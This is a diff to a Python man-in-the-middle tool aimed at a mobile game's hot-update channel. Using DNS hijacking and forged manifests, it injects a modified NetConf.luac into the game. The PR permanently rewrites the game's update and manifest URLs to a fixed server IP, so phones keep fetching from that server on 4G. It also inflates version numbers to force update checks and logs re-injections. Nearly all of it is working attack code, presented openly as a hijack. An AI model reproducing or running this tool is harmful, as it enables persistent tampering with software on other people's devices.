@@ -89,6 +89,30 @@ DEFAULT_ECS_IP = "8.136.37.136"
 DEFAULT_APK = os.path.join(_REPO_ROOT, "apk", "game_base.apk")
 APK_RESCHECKER_ENTRY = "assets/src/app/hotupdate/lobby/ResChecker.luac"
 
+# ─── 官方上游硬编码 host（PR2：4G 永久指向 ECS）────────────────────────────────
+# 4G 下没有 DNS 劫持，进来的 Host 头 = ECS IP（手机直连 ECS），不能再靠 Host 头
+# 判断回源目标。回源官方资源时必须用这里硬编码的官方真实域名。
+#
+# - OFFICIAL_UPDATE_HOSTS：hotfix_update / version.manifest 端点（实测真机用
+#   gxb-api[-tx].hzxuanming.com，见 hijack_live.err 回源解析记录）。第一个为主、
+#   失败回退第二个。
+# - OFFICIAL_MANIFEST_HOST：project.manifest 回源兜底 host（正常用运行时捕获的
+#   real_manifest_host；首个请求尚未捕获时用此兜底）。线上真实 manifest 指向 imeete CDN。
+# - OFFICIAL_FILE_HOST：官方文件字节回源 host（仅 --file-url-mode ecs 验收模式用）。
+OFFICIAL_UPDATE_HOSTS = (
+    "gxb-api.hzxuanming.com",
+    "gxb-api-tx.hzxuanming.com",
+)
+OFFICIAL_MANIFEST_HOST = "gxb-oss.imeete.com"
+OFFICIAL_FILE_HOST = "gxb-oss.imeete.com"
+
+# file_url 改写模式：
+#   "official"（默认/生产）：project.manifest 的 file_url 保持官方原样，官方文件字节
+#       4G 下直连官方 CDN，不经 ECS（NetConf 因 md5 恒定永不被请求，覆盖绝对安全）。
+#   "ecs"（验收用）：file_url 改写为 ECS file base，所有官方文件经 ECS 透传，日志全可见。
+FILE_URL_MODE_OFFICIAL = "official"
+FILE_URL_MODE_ECS = "ecs"
+
 # 路由路径（HTTPS）
 PATH_VERSION = "/hotfix_update"            # update_url 落点
 PATH_PROJECT = "/yj/Lobby/project.manifest"  # 伪 project.manifest 落点
@@ -269,12 +293,15 @@ class MitmAssets:
     """一次性构建并缓存：改过的 NetConf.luac + 伪 project.manifest + 伪 version.manifest。"""
 
     def __init__(self, apk_path: str, ecs_ip: str, self_host: str, tls_port: int = 443,
-                 bump_version: str = "9.9.9.103"):
+                 bump_version: str = "9.9.9.103",
+                 file_url_mode: str = FILE_URL_MODE_OFFICIAL):
         self.apk_path = apk_path
         self.ecs_ip = ecs_ip
         self.self_host = self_host        # 手机看到的我们的主机名（被劫持域名，如 gxb-oss.hzxuanming.com）
         self.tls_port = tls_port
         self.bump_version = bump_version
+        # file_url 改写模式（"official" 默认 / "ecs" 验收）。见 FILE_URL_MODE_* 常量。
+        self.file_url_mode = file_url_mode
         # 真实线上版本号（从回源到的真实 version.manifest 的 version 字段 / manifest_url
         # 文件名动态捕获）。对外下发的版本号优先用它，而非伪造的 bump_version——
         # 否则手机本地版本被写成"未来版本"(9.9.9.103)，切到 4G 用本地版本请求真服
@@ -303,6 +330,17 @@ class MitmAssets:
         port = "" if self.tls_port == 443 else f":{self.tls_port}"
         return f"https://{host}{port}"
 
+    def _ecs_base(self) -> str:
+        """ECS 回写基址 = ECS 公网 IP（self.ecs_ip），手机 4G 下据此 IP 直连，无需 DNS。
+
+        关键：写进 harbor 的永久 manifest_url / update_url（以及 ecs 模式 file_url）必须是
+        ECS 公网 IP，因为热更完成后 HotFixProcessor._updateLocalManifest 把它整体存进
+        harbor，手机切 4G 后据此地址直连。这与"设置期由谁 serve manifest"(self_host：
+        PC 热点=热点网关 IP / ECS 常驻=公网 IP) 无关——PC 热点设置时 self_host=192.168.137.1
+        是热点网关，4G 够不着，绝不能用作 update_url/manifest_url 的写入值。
+        """
+        return self._base_url(self.ecs_ip)
+
     # 下发版本策略：4 段缓冲支配版本——在真实线上版本的每个分量上加小幅缓冲偏移，
     # 分量数与官方一致（同为 4 段），避免 5 段方案触发手机端热更中断（见下方说明）。
     #
@@ -329,6 +367,21 @@ class MitmAssets:
     # 拿不到真实线上版本时的静态兜底支配版本（4 段、每段都远大于任何现实版本）。
     _FALLBACK_DOMINATE_VERSION = "99.99.99.9999"
 
+    @staticmethod
+    def _build_offset() -> int:
+        """build 段（第 4 段）偏移，默认 3000，可被环境变量 MITM_BUILD_OFFSET 覆盖。
+
+        用途：官方未真正出新版时，临时设 MITM_BUILD_OFFSET=3001 使下发版本比 harbor
+        高 1 → 触发手机一次 4G 更新检查（验证 scenario 3 的 NetConf 不被重下）。
+        非法值（无法 int 解析）回退默认 3000。call-time 读取，便于 systemd 进程级
+        env 生效及单测在 import 后改 env。
+        """
+        import os
+        try:
+            return int(os.environ.get("MITM_BUILD_OFFSET", "3000"))
+        except ValueError:
+            return 3000
+
     def _served_version(self) -> str:
         """对外下发 / 写进 harbor 的版本号：4 段缓冲支配版本（与官方同段数，每段略高）。
 
@@ -349,10 +402,15 @@ class MitmAssets:
         comps = self._parse_version_components(real)
         if not comps:
             return self._FALLBACK_DOMINATE_VERSION
-        # 前 N 段叠加缓冲偏移（分量数不足时只对已有分量加偏移）
+        # 前 N 段叠加缓冲偏移（分量数不足时只对已有分量加偏移）。
+        # 前 3 段（major+1/minor+5/patch+9）固定用 _VERSION_SEGMENT_OFFSETS[:3]，
+        # 保持支配语义不变；第 4 段（build）改用 _build_offset()——默认 3000、行为不变，
+        # 临时设 MITM_BUILD_OFFSET=3001 可让 served 比 harbor 高 1 触发一次更新检查
+        # （scenario 3 验证 NetConf 不被重下）。
+        offsets = list(self._VERSION_SEGMENT_OFFSETS[:3]) + [self._build_offset()]
         bumped = [
-            c + self._VERSION_SEGMENT_OFFSETS[i]
-            for i, c in enumerate(comps[:len(self._VERSION_SEGMENT_OFFSETS)])
+            c + offsets[i]
+            for i, c in enumerate(comps[:len(offsets)])
         ]
         # 官方若超过 4 段（理论上不会），原样保留多余分量
         bumped.extend(comps[len(self._VERSION_SEGMENT_OFFSETS):])
@@ -518,8 +576,19 @@ class MitmAssets:
         # ③ 删 zip 差分/整包（强制通用逐文件下载）
         vm.pop("diff_zip", None)
         vm.pop("zip_url", None)
-        # 保留真实 manifest_url / file_url 原样（不动）；
-        # 若 file_url 缺失（"无需更新"响应），也注入一个
+        # ④ ★PR2：把 manifest_url 改写到 ECS（保留官方 path+query，host 换 ECS）。
+        #    热更完成后 _updateLocalManifest 整体替换 harbor → 手机下次（含 4G）取
+        #    project.manifest 时直接打到 ECS，而非真官方（避免官方 NetConf md5≠harbor
+        #    导致重下官方 NetConf 把覆盖冲掉）。
+        #    path 保持官方原样 → 仍命中 real_manifest_paths → project handler 据此回源官方。
+        ecs_base = self._ecs_base()
+        rewritten_manifest_urls = []
+        for url in manifest_urls:
+            parts = urlsplit(url)
+            path_q = parts.path + (("?" + parts.query) if parts.query else "")
+            rewritten_manifest_urls.append(ecs_base + path_q)
+        vm["manifest_url"] = rewritten_manifest_urls
+        # 若 file_url 缺失（"无需更新"响应），也注入一个官方原样兜底
         if not vm.get("file_url"):
             vm["file_url"] = [
                 "https://gxb-oss.imeete.com/other/files/",
@@ -527,9 +596,10 @@ class MitmAssets:
             ]
             logger.info("[patch] 注入 file_url (API 未返回)")
 
-        logger.info("[origin] real version.manifest manifest_url=%s (host=%s path=%s all=%d)",
+        logger.info("[origin] real version.manifest manifest_url=%s (host=%s path=%s all=%d) "
+                    "→ECS=%s",
                     first_url, self.real_manifest_host, self.real_manifest_path,
-                    len(manifest_urls))
+                    len(manifest_urls), rewritten_manifest_urls[0] if rewritten_manifest_urls else None)
 
         return json.dumps(vm, ensure_ascii=False).encode("utf-8")
 
@@ -570,10 +640,20 @@ class MitmAssets:
 
         forged["version"] = self._served_version()
 
-        # ② file_url 保持真实原样（已是被劫持的 gxb 域名；NetConf/ResEnsure 从 PC 下、其余回源）
-        #    self.file_base 仅用于 _selftest 的静态伪 manifest，不在此覆盖真实 file_url。
+        # ② ★PR2：把 update_url 改写到 ECS（host 换 ECS，path=/hotfix_update，保留原 query
+        #    里的 appid/engine_ver/channel/version）。原 update_url 是 list（gxb-api[-tx]
+        #    两条），逐条改写。热更完成后 _updateLocalManifest 整体替换 harbor →
+        #    getUpdateUrl() 永久指向 ECS，4G 直连 IP 无需 DNS。
+        forged_update_url = self._rewrite_update_url(forged.get("update_url"))
+        if forged_update_url is not None:
+            forged["update_url"] = forged_update_url
 
-        # ③ 强制通用逐文件下载，规避 zip 差分/整包压缩
+        # ③ file_url：official 模式保持官方原样（官方文件 4G 直连官方 CDN，ECS 零带宽）；
+        #    ecs 模式（验收）改写为 ECS file base，所有官方文件经 ECS 透传、日志全可见。
+        if self.file_url_mode == FILE_URL_MODE_ECS:
+            forged["file_url"] = [self._ecs_base() + FILE_URL_PREFIXES[1]]
+
+        # ④ 强制通用逐文件下载，规避 zip 差分/整包压缩
         forged["forbid_zip"] = True
         forged.pop("diff_zip", None)
         forged.pop("zip_url", None)
@@ -619,15 +699,46 @@ class MitmAssets:
         #     file_list = forged["file_list"]
 
         logger.info(
-            "[patch] project.manifest: NetConf=%s inject_checker=%s ResEnsure=%s ResChecker=%s keys=%d",
+            "[patch] project.manifest: NetConf=%s inject_checker=%s ResEnsure=%s ResChecker=%s "
+            "keys=%d update_url→ECS=%s file_url_mode=%s",
             target_key or "-",
             INJECT_LOBBY_CHECKER,
             INJECT_LOBBY_CHECKER and RESENSURE_FILE_KEY in file_list,
             INJECT_LOBBY_CHECKER and RESCHECKER_FILE_KEY in file_list,
             len(file_list),
+            (forged_update_url[0] if isinstance(forged_update_url, list) and forged_update_url
+             else forged_update_url),
+            self.file_url_mode,
         )
 
         return json.dumps(forged, ensure_ascii=False).encode("utf-8")
+
+    def _rewrite_update_url(self, update_url):
+        """把 project.manifest 的 update_url（更新检查端点）改写到 ECS。
+
+        host 换为本服务（ECS）、path 统一为 PATH_VERSION（/hotfix_update）、保留原 query
+        里的 appid/engine_ver/channel/version 等参数。原 update_url 可能是 list（gxb-api[-tx]
+        两条）或单个字符串，逐条改写，保持 list 条数。无 update_url 时返回 None（不注入）。
+        """
+        from urllib.parse import urlsplit
+
+        if isinstance(update_url, list):
+            urls = [u for u in update_url if isinstance(u, str) and u]
+            was_list = True
+        elif isinstance(update_url, str) and update_url:
+            urls = [update_url]
+            was_list = False
+        else:
+            return None
+
+        ecs_base = self._ecs_base()
+        rewritten = []
+        for u in urls:
+            parts = urlsplit(u)
+            # path 统一为 ECS 的 /hotfix_update 端点；保留原 query（appid 等）
+            q = ("?" + parts.query) if parts.query else ""
+            rewritten.append(ecs_base + PATH_VERSION + q)
+        return rewritten if was_list else rewritten[0]
 
 
 # ─── 从 hotfix_update 请求参数推断 manifest_url ───────────────────────────────
@@ -734,6 +845,10 @@ def make_http_handler(assets: MitmAssets, enable_origin: bool = True):
                 if rel == assets.served_name or rel.endswith(assets.served_name):
                     logger.info("[mitm] %s host=%s → NetConf.luac (%dB md5=%s)",
                                 client_ip, host, len(assets.netconf_luac), assets.served_md5)
+                    # ★PR2：NetConf 真被请求 = 首次注入（正常）；官方更新流程中本不应
+                    #    出现（md5 恒定→不进 diff），出现=覆盖被误重下，反向告警可 grep。
+                    logger.info("[REINJECT] client=%s NetConf.luac re-served md5=%s",
+                                client_ip, assets.served_md5)
                     self._send(assets.netconf_luac, "application/octet-stream")
                     return
                 # ResEnsure 文件（跳过校验版本）——仅在注入开启时由 PC 提供，
@@ -790,27 +905,42 @@ def make_http_handler(assets: MitmAssets, enable_origin: bool = True):
             # 回源时把 version 降级为 1.0.0.0，确保真实 API 返回完整的 manifest_url
             # （否则手机已是最新版时 API 只返回 {"version":"xxx"}，不带 manifest_url）
             origin_path = _downgrade_version_in_path(raw_path)
-            if not enable_origin or not host:
+            if not enable_origin:
                 logger.info("[mitm] %s host=%s → version.manifest (static, v=%s)",
                             client_ip, host, assets.version)
                 self._send(assets.version_manifest, "application/json")
                 return
-            status, body, _ = _origin_fetch(host, origin_path)
+            # ★PR2：回源官方 version.manifest 改用硬编码官方 update host（不依赖进来的
+            #    Host 头——4G 下 Host=ECS IP）。主 host 失败回退备 host。
+            status, body = 502, b""
+            used_host = None
+            for official_host in OFFICIAL_UPDATE_HOSTS:
+                status, body, _ = _origin_fetch(official_host, origin_path)
+                if status == 200 and body:
+                    used_host = official_host
+                    break
             if status == 200 and body:
                 # 调试：打印回源响应前200字节
                 logger.info("[mitm] %s host=%s version.manifest origin body(200B): %s",
-                            client_ip, host, body[:200])
+                            client_ip, used_host, body[:200])
                 try:
                     patched = assets.patch_real_version_manifest(body)
-                    logger.info("[mitm] %s host=%s → version.manifest (origin-patched, v=%s, %dB) "
-                                "real_manifest_url host=%s",
-                                client_ip, host, assets._served_version(), len(patched),
-                                assets.real_manifest_host)
+                    served = assets._served_version()
+                    manifest_url_to_ecs = None
+                    try:
+                        import json as _json
+                        _vm = _json.loads(patched.decode("utf-8"))
+                        _mu = _vm.get("manifest_url")
+                        manifest_url_to_ecs = _mu[0] if isinstance(_mu, list) and _mu else _mu
+                    except Exception:
+                        pass
+                    logger.info("[CHAIN-VER] client=%s real_online=%s served=%s manifest_url→ECS=%s",
+                                client_ip, assets.real_online_version, served, manifest_url_to_ecs)
                     self._send(patched, "application/json")
                     return
                 except Exception as exc:
                     logger.warning("[mitm] %s host=%s version.manifest patch failed: %s "
-                                   "→ fallback static", client_ip, host, exc)
+                                   "→ fallback static", client_ip, used_host, exc)
             else:
                 logger.warning("[mitm] %s host=%s version.manifest origin fetch status=%s "
                                "→ fallback static", client_ip, host, status)
@@ -823,41 +953,77 @@ def make_http_handler(assets: MitmAssets, enable_origin: bool = True):
             setup 阶段必须优先让客户端拿到可下载的最小热更包；回源失败只写日志，
             对手机返回已经 patch 过 NetConf / ResEnsure / ResChecker 的静态 manifest。
             """
-            if not enable_origin or not host:
+            if not enable_origin:
                 logger.info("[mitm] %s host=%s → project.manifest (static, %dB)",
                             client_ip, host, len(assets.project_manifest))
                 self._send(assets.project_manifest, "application/json")
                 return
-            status, body, _ = _origin_fetch(host, raw_path)
+            # ★PR2：回源官方 project.manifest 改用捕获的官方 manifest host（不依赖进来的
+            #    Host 头——4G 下 Host=ECS IP）。优先按 path 命中的官方 host，再退 first-seen
+            #    real_manifest_host，最后退硬编码 OFFICIAL_MANIFEST_HOST。
+            path_only = raw_path.split("?", 1)[0]
+            origin_host = (
+                assets.real_manifest_hosts_by_path.get(path_only)
+                or assets.real_manifest_host
+                or OFFICIAL_MANIFEST_HOST
+            )
+            status, body, _ = _origin_fetch(origin_host, raw_path)
             if status == 200 and body:
                 try:
                     patched = assets.patch_real_project_manifest(body)
-                    logger.info("[mitm] %s host=%s → project.manifest (origin-patched, %dB)",
-                                client_ip, host, len(patched))
+                    served = assets._served_version()
+                    update_url_to_ecs = None
+                    file_count = 0
+                    try:
+                        import json as _json
+                        _pm = _json.loads(patched.decode("utf-8"))
+                        _uu = _pm.get("update_url")
+                        update_url_to_ecs = _uu[0] if isinstance(_uu, list) and _uu else _uu
+                        _fl = _pm.get("file_list")
+                        file_count = len(_fl) if isinstance(_fl, dict) else 0
+                    except Exception:
+                        pass
+                    logger.info("[CHAIN-PROJ] client=%s real_online=%s served=%s "
+                                "netconf_md5=%s(const) update_url→ECS=%s file_count=%d",
+                                client_ip, assets.real_online_version, served,
+                                assets.served_md5, update_url_to_ecs, file_count)
                     self._send(patched, "application/json")
                     return
                 except Exception as exc:
                     logger.error("[mitm] %s host=%s project.manifest patch failed: %s "
-                                 "→ static fallback", client_ip, host, exc)
+                                 "→ static fallback", client_ip, origin_host, exc)
                     self._send(assets.project_manifest, "application/json")
                     return
             logger.error("[mitm] %s host=%s project.manifest origin fetch status=%s "
-                         "→ static fallback", client_ip, host, status)
+                         "→ static fallback", client_ip, origin_host, status)
             self._send(assets.project_manifest, "application/json")
 
         def _handle_origin_passthrough(self, client_ip: str, host: str, path: str):
-            if not enable_origin or not host:
+            if not enable_origin:
                 logger.warning("[mitm] %s host=%s → %s (no-origin, 404)", client_ip, host, path)
                 self._send(b"", code=404)
                 return
-            status, body, ctype = _origin_fetch(host, path)
+            # ★PR2：official 模式维持现状（用进来的 Host 头回源——official 模式下文件
+            #    请求本就直连官方、不经此路径，保持兼容）。ecs 模式（验收）下 4G 文件经
+            #    ECS 透传，进来的 Host=ECS IP 不能用来回源，改用硬编码官方 file host。
+            origin_host = host
+            if assets.file_url_mode == FILE_URL_MODE_ECS:
+                origin_host = OFFICIAL_FILE_HOST
+            if not origin_host:
+                logger.warning("[mitm] %s host=%s → %s (no-origin-host, 404)", client_ip, host, path)
+                self._send(b"", code=404)
+                return
+            status, body, ctype = _origin_fetch(origin_host, path)
             if status and status != 502:
                 logger.info("[mitm] %s host=%s → %s (origin %s, %dB)",
-                            client_ip, host, path, status, len(body))
+                            client_ip, origin_host, path, status, len(body))
+                if assets.file_url_mode == FILE_URL_MODE_ECS:
+                    name = path.split("?", 1)[0].rsplit("/", 1)[-1]
+                    logger.info("[OFFICIAL-FILE] client=%s %s %dB", client_ip, name, len(body))
                 self._send(body, ctype or "application/octet-stream", code=status)
                 return
             logger.warning("[mitm] %s host=%s → %s (origin failed status=%s, 404)",
-                           client_ip, host, path, status)
+                           client_ip, origin_host, path, status)
             self._send(b"", code=404)
 
     return Handler
@@ -1017,7 +1183,8 @@ class DnsResponder:
 def run(host_ip: str, ecs_ip: str = DEFAULT_ECS_IP, apk_path: str = DEFAULT_APK,
         tls_port: int = 443, dns_port: int = 53, no_dns: bool = False,
         cert_dir: str = None, enable_origin: bool = True,
-        bump_version: str = "9.9.9.103", dns_listen_host: str | None = None):
+        bump_version: str = "9.9.9.103", dns_listen_host: str | None = None,
+        file_url_mode: str = FILE_URL_MODE_OFFICIAL):
     """启动热更 MITM（HTTPS manifest 服务 + DNS 劫持）。
 
     host_ip: 写进 DNS 应答 / NetConf / manifest 的地址（手机据此连本服务的 443）。
@@ -1031,7 +1198,8 @@ def run(host_ip: str, ecs_ip: str = DEFAULT_ECS_IP, apk_path: str = DEFAULT_APK,
     cert_path = os.path.join(cert_dir, "mitm_cert.pem")
     key_path = os.path.join(cert_dir, "mitm_key.pem")
 
-    assets = MitmAssets(apk_path, ecs_ip, host_ip, tls_port=tls_port, bump_version=bump_version)
+    assets = MitmAssets(apk_path, ecs_ip, host_ip, tls_port=tls_port, bump_version=bump_version,
+                        file_url_mode=file_url_mode)
     httpd = start_https_server(assets, "0.0.0.0", tls_port, cert_path, key_path,
                                enable_origin=enable_origin)
 
@@ -1149,8 +1317,20 @@ def _selftest() -> None:
     assert patched["version"] == assets._served_version(), patched["version"]
     assert patched["forbid_zip"] is True
     assert "diff_zip" not in patched and "zip_url" not in patched
-    # file_url 保持真实原样（不再覆盖为 PC）——只要 lobby 热更条目被改即可
+    # ★PR2：official 模式 file_url 保持真实原样（官方文件 4G 直连官方 CDN）
     assert patched.get("file_url") == real_manifest.get("file_url"), patched.get("file_url")
+    # ★PR2：update_url 改写到 ECS（host 换 ECS、path=/hotfix_update、保留原 query）
+    real_uu = real_manifest.get("update_url")
+    if real_uu:
+        from urllib.parse import urlsplit as _urlsplit
+        ecs_base = assets._ecs_base()
+        patched_uu = patched.get("update_url")
+        assert isinstance(patched_uu, list) and len(patched_uu) == len(real_uu), patched_uu
+        for orig, new in zip(real_uu, patched_uu):
+            assert new.startswith(ecs_base + PATH_VERSION), new
+            assert _urlsplit(new).query == _urlsplit(orig).query, (new, orig)
+            assert "appid=" in new, new
+        print(f"[OK] update_url → ECS: {patched_uu[0]}")
     nc = patched_fl["src/app/config/NetConf.luac"]
     assert nc["md5"] == assets.served_md5 and nc["size"] == assets.served_size
     assert nc["name"] == assets.served_name
@@ -1197,21 +1377,22 @@ def _selftest() -> None:
         "zip_url": ["y"],
     }, ensure_ascii=False).encode("utf-8")
     patched_vm = json.loads(assets.patch_real_version_manifest(fake_vm).decode("utf-8"))
-    # 下发版本 = 4 段缓冲支配版本：真实线上版每段 +缓冲偏移(1,5,9,1000)，段数与官方一致
+    # 下发版本 = 4 段缓冲支配版本：真实线上版每段 +缓冲偏移(1,5,9,3000)，段数与官方一致
     assert assets.real_online_version == "1.0.0.51", assets.real_online_version
-    assert patched_vm["version"] == "2.5.9.1051", patched_vm["version"]  # 1.0.0.51 → 2.5.9.1051
+    assert patched_vm["version"] == "2.5.9.3051", patched_vm["version"]  # 1.0.0.51 → 2.5.9.3051
     _sv = [int(x) for x in patched_vm["version"].split(".")]
     _rv = [int(x) for x in "1.0.0.51".split(".")]
     assert len(_sv) == len(_rv) and all(a >= b for a, b in zip(_sv, _rv)) and any(a > b for a, b in zip(_sv, _rv)), patched_vm["version"]
     assert patched_vm["project_md5"] == ""
     assert "diff_zip" not in patched_vm and "zip_url" not in patched_vm
-    # 保留真实 manifest_url / file_url 原样
+    # ★PR2：manifest_url 已改写到 ECS（保留官方 path+query，host 换 ECS）
+    _ecs = assets._ecs_base()
     assert patched_vm["manifest_url"] == [
-        "https://gxb-oss.hzxuanming.com/yj/proj/project_10001.manifest?appid=10001",
-        "https://gxb-cos.hzxuanming.com/yj/manifests/1073/1.0.0.16/198/project-1.0.0.16.manifest",
-    ]
+        _ecs + "/yj/proj/project_10001.manifest?appid=10001",
+        _ecs + "/yj/manifests/1073/1.0.0.16/198/project-1.0.0.16.manifest",
+    ], patched_vm["manifest_url"]
     assert patched_vm["file_url"] == ["https://gxb-oss.hzxuanming.com/yj/files/"]
-    # 记下真实 manifest_url 的 host + path（含 query）
+    # 仍记下真实官方 manifest_url 的 host + path（含 query），供 project handler 回源
     assert assets.real_manifest_host == "gxb-oss.hzxuanming.com", assets.real_manifest_host
     assert assets.real_manifest_path == "/yj/proj/project_10001.manifest?appid=10001", assets.real_manifest_path
     assert "/yj/proj/project_10001.manifest" in assets.real_manifest_paths
@@ -1269,6 +1450,10 @@ def main() -> None:
     ap.add_argument("--no-dns", action="store_true", help="只起 HTTPS，不起 DNS")
     ap.add_argument("--no-origin", action="store_true",
                     help="禁用透明回源（project.manifest 回退静态、文件请求 404；调试用）")
+    ap.add_argument("--file-url-mode", choices=[FILE_URL_MODE_OFFICIAL, FILE_URL_MODE_ECS],
+                    default=FILE_URL_MODE_OFFICIAL,
+                    help="file_url 改写模式：official（默认/生产，官方文件 4G 直连官方 CDN）"
+                         " / ecs（验收，官方文件经 ECS 透传、日志全可见）")
     ap.add_argument("--selftest", action="store_true", help="跑离线自测后退出")
     args = ap.parse_args()
 
@@ -1284,7 +1469,8 @@ def main() -> None:
 
     run(args.host_ip, ecs_ip=args.ecs_ip, apk_path=args.apk,
         tls_port=args.tls_port, dns_port=args.dns_port, no_dns=args.no_dns,
-        enable_origin=not args.no_origin, dns_listen_host=args.dns_listen_host)
+        enable_origin=not args.no_origin, dns_listen_host=args.dns_listen_host,
+        file_url_mode=args.file_url_mode)
     logger.info("MITM 设置期服务已启动；手机连热点开游戏触发热更即可。Ctrl+C 退出。")
     try:
         threading.Event().wait()
